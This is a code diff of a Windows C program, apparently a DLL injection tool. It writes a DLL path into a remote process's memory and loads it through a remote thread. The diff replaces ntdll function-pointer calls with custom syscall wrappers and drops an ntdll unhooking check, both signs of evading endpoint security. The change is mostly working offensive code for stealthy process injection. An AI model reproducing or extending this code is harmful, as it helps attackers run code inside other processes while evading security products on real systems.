@@ -5,81 +5,39 @@
 #include "detector.h"
 #include "evasion.h"
 
-// Function Prototypes
-typedef NTSTATUS(NTAPI* pSysAlloc)(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);
-typedef NTSTATUS(NTAPI* pSysWrite)(HANDLE, PVOID, PVOID, ULONG, PULONG);
-
-// Function to Resolve APIs
-FARPROC ResolveFn(LPCSTR mod, LPCSTR fn) {
-    HMODULE hMod = GetModuleHandle(mod);
-    if (!hMod) return NULL;
-
-    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)hMod;
-    IMAGE_NT_HEADERS* ntHdr = (IMAGE_NT_HEADERS*)((BYTE*)hMod + dosHdr->e_lfanew);
-    IMAGE_EXPORT_DIRECTORY* expDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hMod + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-
-    DWORD* names = (DWORD*)((BYTE*)hMod + expDir->AddressOfNames);
-    WORD* ords = (WORD*)((BYTE*)hMod + expDir->AddressOfNameOrdinals);
-    DWORD* funcs = (DWORD*)((BYTE*)hMod + expDir->AddressOfFunctions);
-
-    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
-        LPCSTR currFn = (LPCSTR)((BYTE*)hMod + names[i]);
-        if (strcmp(currFn, fn) == 0) {
-            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
-        }
-    }
-    return NULL;
-}
-
-// Resolve Remote Module Handle
-HMODULE FindModInProc(HANDLE hProc, const char* modName) {
-    HMODULE hMods[512];
-    DWORD needed;
-    if (EnumProcessModules(hProc, hMods, sizeof(hMods), &needed)) {
-        for (int i = 0; i < (needed / sizeof(HMODULE)); i++) {
-            char modPath[MAX_PATH];
-            if (GetModuleFileNameExA(hProc, hMods[i], modPath, sizeof(modPath))) {
-                const char* baseName = strrchr(modPath, '\\') ? strrchr(modPath, '\\') + 1 : modPath;
-                if (_stricmp(baseName, modName) == 0) return hMods[i];
-            }
-        }
-    }
-    return NULL;
-}
 
 // Core Injection Logic
 void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
-    LPVOID memLoc = NULL;
+    PVOID memLoc = NULL;
     SIZE_T sz = strlen(dllEnc) + 1;
+    //SIZE_T sz = 0x10000;
     HANDLE hThreadRemote;
     NTSTATUS status;
 
     // Resolve Required Functions
     FARPROC pLLoad = ResolveFn("kernel32.dll", "LoadLibraryA");
-    FARPROC pGProc = ResolveFn("kernel32.dll", "GetProcAddress");
 
-    if (!pLLoad || !pGProc) {
+    if (!pLLoad) {
         printf("[!] Unable to resolve core functions.\n");
         return;
     }
 
-    pSysAlloc pAlloc = (pSysAlloc)ResolveFn("ntdll.dll", "NtAllocateVirtualMemory");
-    pSysWrite pWrite = (pSysWrite)ResolveFn("ntdll.dll", "NtWriteVirtualMemory");
-
-    if (!pAlloc || !pWrite) {
-        printf("[!] Unable to resolve NT functions.\n");
-        return;
-    }
-
-    // Allocate Memory
-    status = pAlloc(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    SetSyid(GetSyid("NtAllocateVirtualMemory"));
+    status = CustAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != 0) {
-        printf("[!] Memory allocation failed (Err: 0x%lX).\n", status);
+        printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
+    } else {
+        printf("[+] Memory allocated at: %p\n", memLoc);
+    }
+
+    if (memLoc == NULL) {
+        printf("[!] Memory allocation failed, BaseAddress is NULL.\n");
         return;
     }
 
+    SetSyid(GetSyid("NtWriteVirtualMemory"));
     // Write Encrypted DLL Path to Remote Process
-    status = pWrite(hProc, memLoc, (PVOID)dllEnc, (ULONG)sz, NULL);
+    status = CustWVM(hProc, memLoc, (PVOID)dllEnc, (ULONG)sz, NULL);
     if (status != 0) {
         printf("[!] Memory write failed (Err: 0x%lX).\n", status);
         return;
@@ -94,15 +52,7 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
     WaitForSingleObject(hThreadRemote, INFINITE);
     CloseHandle(hThreadRemote);
 
-    // Verify if DLL is Loaded
-    Sleep(500);
-    HMODULE hRemMod = FindModInProc(hProc, strrchr(dllEnc, '\\') + 1);
-    if (!hRemMod) {
-        printf("[!] Module not found in remote process.\n");
-        return;
-    }
-
-    printf("[*] Successfully injected module @ %p\n", hRemMod);
+    printf("[*] Successfully injected module\n");
 }
 
 // Entry Function
@@ -116,10 +66,6 @@ int main(int argc, char* argv[]) {
     if (argc != 2) {
         LaunchCalc();
         return 0;
-    }
-
-    if (IsNtDllHooked()) {
-        UnhookNtdll();
     }
 
     const char* dllPath = argv[1];
